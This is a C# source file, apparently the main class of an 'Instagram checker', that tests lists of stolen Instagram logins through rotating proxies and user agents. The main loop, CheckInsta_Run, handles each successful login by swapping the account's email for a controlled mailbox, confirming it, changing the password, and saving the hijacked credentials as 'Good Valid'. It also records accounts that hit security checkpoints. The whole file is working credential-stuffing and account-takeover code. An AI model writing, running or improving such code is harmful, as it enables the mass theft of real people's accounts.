using FileLibrary;
using InstagramLibrary;
using InstagramLibrary.Model;
using InstaLog;
using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;

namespace Instagram_Checker.BLL
{
    public class Model
    {
        public object[] locker = new object[1];

        private Proxy _proxy;
        private Accounts _account;
        private AccountsMail _accMails;
        private FileWorker _fileWorker;
        private UserAgents _agents;

        LogIO.Logging logging = new LogIO.Logging(LogIO.WriteLog);

        private List<string> _proxyHrefs;
        private int _threadCount;

        public bool IsProgramComplitlyEnded { get; private set; }
        public bool IsAccountInited { get; private set; }
        public bool IsObjectsReady { get; private set; }
        public bool IsAgentsInited { get; private set; }
        public bool IsProxyInited { get; private set; }
        public bool IsMailsReady { get; private set; }
        public int ProxySwitched { get; private set; }
        public int ProxyBlocked { get; private set; }
        public int AccsSwitched { get; private set; }
        public int AccsBlocked { get; private set; }

        private bool _noMoreProxy;

        public List<string> AccountInfoDataSet_Required { get; private set; }
        public List<string> AccountInfoDataSet_Success { get; private set; }

        List<Dictionary<string, object>> _deleteProxy;

        public Proxy GetProxy { get { return _proxy; } }
        public Accounts GetAccounts { get { return _account; } }
        public AccountsMail GetAccountsMail { get { return _accMails; } }
        public UserAgents GetUserAgents { get { return _agents; } }

        public Model()
        {
            AccsBlocked = 0;
            ProxyBlocked = 0;
            AccsSwitched = 0;
            ProxySwitched = 0;
            IsMailsReady = false;
            IsProxyInited = false;
            IsObjectsReady = false;
            IsAgentsInited = false;
            IsAccountInited = false;
            IsProgramComplitlyEnded = false;
            AccountInfoDataSet_Success = new List<string>();
            AccountInfoDataSet_Required = new List<string>();

            _noMoreProxy = true;
            _deleteProxy = new List<Dictionary<string, object>>();

            _proxy = new Proxy();
            _account = new Accounts();
            _accMails = new AccountsMail();
            _fileWorker = new FileWorker();
            _agents = new UserAgents();
        }

        public void InitAgents()
        {
            Task.Run(() =>
            {
                _agents.GetAccountsFromBaseFile();
                while (true)
                {
                    if (_agents.AgentsReady)
                        break;
                }
                logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Agents inited! {_agents.CountAgents} agents are ready", Method = "Model.InitAgents" });
                IsAgentsInited = true;
            });

        }

        public void InitAccounts()
        {
            Task.Run(() =>
            {
                _account.GetAccountsFromBaseFile();
                while (!_account.UsersReady) { }

                logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Accounts inited! {_account.CountUsers} accounts are ready", Method = "Model.InitAccounts" });
                IsAccountInited = true;
            });
        }

        public void InitProxy(bool isApiNeed, List<string> hrefs = null)
        {
            if (isApiNeed == true)
                _proxyHrefs = hrefs;

            Task.Run(() =>
                {
                    if (isApiNeed)
                        _proxy.GetRefProxy(hrefs);

                    _proxy.GetAllInfoFromFile();
                    _proxy.InstaProxy_Init();
                    _proxy.MailProxy_Init();
                    while (!_proxy.IsProxyReady) { }

                    logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Proxy inited! {_proxy.CountProxy} proxies are ready", Method = "Model.InitProxy" });
                    IsProxyInited = true;
                });
        }

        public void InitAccountsMail()
        {
            Task.Run(() =>
            {
                _accMails.GetMailsFromBaseFile();
                while (_accMails.MailsReady) { }
                IsMailsReady = true;
            });
        }

        public void UpdateProxy(List<string> hrefs)
        {
            if (hrefs != null)
                if (hrefs.Count > 0)
                {
                    Task.Run(() =>
                    {
                        _proxy.GetRefProxy(hrefs);
                        while (_proxy.IsProxyReady)
                            _proxy.ResolveProxy(_accMails.CountMails);
                        _noMoreProxy = true;
                    });
                }
        }


        public void CheckAllAccounts(int countThreads)
        {
            Task.Run(() => DeleteAccounts_Run());
            Task.Run(() => DeleteMails_Run());

            for (int i = 0; i < countThreads; i++)
            {
                Task.Run(() => CheckInsta_Run());
                _threadCount++;
            }
            Task.Run(() => CheckThreads_Run());
        }


        #region AsyncMethods
        private async void CheckInsta_Run()
        {
            List<Dictionary<string, object>> proxyOptions = new List<Dictionary<string, object>>();


            int proxyPos = 0;
            int checkPos = 0;

            int _i_helper = 0;
            bool threadIsWorking = true;

            while ((!_account.AllPathChecked) && _account.CountUsers != 0)
            {
                for (int j = 0; j < 25; j++)
                {
                    try
                    {
                        if (_deleteProxy.Contains(_proxy.InstaProxies[j]))
                        {
                            lock (_proxy.locker)
                            {
                                _proxy.InstaProxies.Remove(_proxy.InstaProxies[j]);
                                j--;
                                continue;
                            }
                        }
                        lock (_proxy.locker)
                        {
                            proxyOptions.Add(_proxy.InstaProxies[j]);
                            _proxy.InstaProxies.Remove(_proxy.InstaProxies[j]);
                        }
                    }
                    catch
                    {
                        if (_noMoreProxy == true)
                        {
                            _noMoreProxy = false;
                            logging.Invoke(LogIO.mainLog, new Log() { Date = DateTime.Now, LogMessage = "Last 500 proxy!", UserName = null, Method = "Model.CheckInsta" });
                            if (_proxyHrefs != null)
                            {
                                if (_proxyHrefs.Count > 0)
                                    logging.Invoke(LogIO.mainLog, new Log() { Date = DateTime.Now, LogMessage = "Update link proxies!", UserName = null, Method = "Model.CheckInsta" });
                                UpdateProxy(_proxyHrefs);
                                while (!_noMoreProxy) { }
                            }
                            else
                            {
                                logging.Invoke(LogIO.mainLog, new Log() { Date = DateTime.Now, LogMessage = "ReUpdate proxy from file!", UserName = null, Method = "Model.CheckInsta" });
                                Task.Run(() =>
                                {
                                    _proxy.GetAllInfoFromFile();
                                    _proxy.ResolveProxy(_accMails.CountMails);
                                }).Wait();
                                _noMoreProxy = true;
                            }
                        }
                        Thread.Sleep(500);
                        continue;
                    }
                }

                int i = _i_helper;
                for (; i < 250; i++, _i_helper++)
                {
                    if (_account.CountUsers <= 500 && !_account.AllPathChecked)
                    {
                        lock (_account.locker)
                            _account.SetUser();
                    }
                    string instaLogin, instaPassword;
                    try
                    {
                        Dictionary<string, string> tempAcc;
                        lock (_account.locker)
                        {
                            tempAcc = _account.Users[Randomer.Next(0, _account.CountUsers)];
                        }
                        instaLogin = tempAcc["instaLogin"];
                        instaPassword = tempAcc["instaPassword"];
                        while (_account.UsersForDeleting.Contains(instaLogin + ":" + instaPassword))
                        {
                            lock (_account.locker)
                            {
                                tempAcc = _account.Users[Randomer.Next(0, _account.CountUsers)];
                            }
                            instaLogin = tempAcc["instaLogin"];
                            instaPassword = tempAcc["instaPassword"];
                        }
                    }
                    catch
                    {
                        _threadCount--;
                        threadIsWorking = false;
                        break;
                    }

                    bool check = true;
                    HttpAndroid android;
                    try
                    {
                        android = new HttpAndroid(instaLogin, instaPassword, proxyOptions[proxyPos], _agents.Agents[Randomer.Next(0, _agents.CountAgents)]);
                        var loggedIn = await android.LogIn();
                        if (loggedIn.status == "success")
                        {
                            ProfileResult profile = await android.GetProfile();
                            if (profile != null) //means that account is logined
                            {
                                int randomPosition = Randomer.Next(0, _accMails.CountMails);
                                var resMail = _accMails.Mails[randomPosition];
                                _accMails.Mails.Remove(_accMails.Mails[randomPosition]);
                                _accMails.MailsForDeleting.Add(resMail["mailLogin"] + ":" + resMail["mailPassword"]);

                                string writePassword = instaPassword;

                                DateTime time = DateTime.Now;
                                Thread.Sleep(3000);
                                UpdateProfileResult updateStatus = await android.UpdateProfile(profile, resMail["mailLogin"]);

                                if (updateStatus.status == "ok")
                                {
                                    bool confirmed = true;
                                    string path = null;
                                    try
                                    {
                                        Mail mailClient = new Mail(resMail["mailLogin"], resMail["mailPassword"]);
                                        Thread.Sleep(1000);
                                        path = mailClient.GetMailPath(time);
                                        Thread.Sleep(1000);
                                        confirmed = android.ConfirmMail(path, _proxy.MailProxies[Randomer.Next(0, _proxy.MailProxies.Count)]);
                                    }
                                    catch
                                    {
                                        logging.Invoke(LogIO.mainLog, new Log() { Date = DateTime.Now, LogMessage = $"Email not confirmed: {resMail["mailLogin"]}:{resMail["mailPassword"]}", Method = "Model.CheckInsta", UserName = null });
                                        confirmed = false;
                                    }


                                    string newPass = Generator.GeneratePassword();
                                    PasswordChangeResult passResult = await android.ChangePassword(newPass);
                                    if (passResult.status == "ok")
                                        writePassword = newPass;
                                    else
                                        _fileWorker.BadPass($"{profile.form_data.username}:{instaPassword}");


                                    if (confirmed)
                                    {
                                        string goodValidResult = profile.form_data.username + ":" + writePassword + ":" + resMail["mailLogin"] + ":" + resMail["mailPassword"];
                                        AccountInfoDataSet_Success.Add(goodValidResult);
                                        logging.Invoke(LogIO.easyPath, new Log()
                                        {
                                            UserName = $"{profile.form_data.username}:{writePassword}",
                                            Date = DateTime.Now,
                                            LogMessage = "Good Valid",
                                            Method = "Model.CheckInsta"
                                        });
                                        _fileWorker.GoodValid(goodValidResult);
                                    }
                                    else
                                    {
                                        string mailNotConfirmedResult = profile.form_data.username + ":" + writePassword + ":" + resMail["mailLogin"] + ":" + resMail["mailPassword"];
                                        AccountInfoDataSet_Success.Add(mailNotConfirmedResult);
                                        logging.Invoke(LogIO.easyPath, new Log()
                                        {
                                            UserName = $"{profile.form_data.username}:{writePassword}",
                                            Date = DateTime.Now,
                                            LogMessage = $"Mail have troubles. Account not confirmed, but mail changed",
                                            Method = "Model.CheckInsta"
                                        });
                                        lock (_fileWorker.locker)
                                        {
                                            _fileWorker.BadMail(mailNotConfirmedResult);
                                        }
                                    }
                                }
                                else
                                {
                                    string account = instaLogin + ":" + writePassword;
                                    var checkProfile = await android.GetProfile();
                                    if (profile.form_data.email == checkProfile.form_data.email && !String.IsNullOrEmpty(checkProfile.form_data.phone_number))
                                    {
                                        account += ":" + resMail["mailLogin"] + ":" + resMail["mailPassword"];
                                        lock (_fileWorker.locker)
                                        {
                                            _fileWorker.BadValid(account);
                                        }
                                    }
                                    else if (profile.form_data.email == checkProfile.form_data.email)
                                    {
                                        lock (_fileWorker.locker)
                                        {
                                            _fileWorker.BadMail(account);
                                        }
                                    }
                                }
                            }
                        }
                        else if (loggedIn.status == "checkpoint_required")//means that account is required
                        {
                            string account = $"{instaLogin}:{instaPassword}";
                            logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Challenge required! {account}", Method = "Model.CheckInsta" });
                            logging.Invoke(LogIO.easyPath, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Challenge required! {account}", Method = "Model.CheckInsta" });

                            lock (locker)
                            {
                                AccountInfoDataSet_Required.Add(account);
                            }
                            lock (_fileWorker.locker)
                            {
                                _fileWorker.Checkpoint(account);
                            }
                        }
                        else if (loggedIn.status == "Request Timeout")
                        {
                            i--;
                            _i_helper--;
                            check = false;
                        }
                        else
                        {
                            logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Bad Credentials", Method = "Model.CheckInsta" });
                        }

                    }
                    catch (Exception ex)
                    {
                        logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Exception! {ex.Message} -- {ex.Source}", Method = "Model.CheckInsta" });
                        if (ex.Message.Contains("400") || ex.Message.Contains("403"))
                        {
                            logging.Invoke(LogIO.easyPath, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Exception 400! Bad request! Switch proxy", Method = "Model.CheckInsta" });
                            ProxyBlocked++;
                            _deleteProxy.Add(proxyOptions[proxyPos]);
                        }
                        proxyPos++;
                        checkPos = 0;

                        i--;
                        _i_helper--;
                        check = false;
                    }
                    if (check)
                    {
                        lock (_account.locker) { _account.UsersForDeleting.Add(instaLogin + ":" + instaPassword); }
                        AccsSwitched++;
                    }

                    checkPos++;
                    if (checkPos % 10 == 0)
                    {
                        ProxySwitched++;
                        proxyPos++;
                    }

                    if (proxyPos == proxyOptions.Count)
                    {
                        bool checkIf = true;
                        if (_proxyHrefs != null)
                            if (_proxyHrefs.Count > 0)
                            {
                                UpdateProxy(_proxyHrefs);
                                checkIf = false;
                            }
                        if (checkIf)
                        {
                            _proxy.GetAllInfoFromFile();
                            _proxy.ResolveProxy(_accMails.CountMails);
                        }
                    }

                    if (Randomer.Next(0, 32000) == 1637)
                        AccsBlocked++;
                }
                if (!threadIsWorking)
                    break;
            }
            _threadCount--;
        }
        
        private void DeleteAccounts_Run()
        {
            while (true)
            {
                Thread.Sleep(180000);
                lock (_account.locker)
                {
                    _account.DeleteAccountsFromFile();
                }
            }
        }
        private void DeleteMails_Run()
        {
            while (true)
            {
                Thread.Sleep(400000);
                lock (_accMails.locker)
                {
                    _accMails.DeleteMailFromFile();
                }
            }
        }


        private void CheckThreads_Run()
        {
            while (_threadCount > 0)
            {
                Thread.Sleep(5000);
            }
            IsProgramComplitlyEnded = true;
        }
        #endregion
    }
}
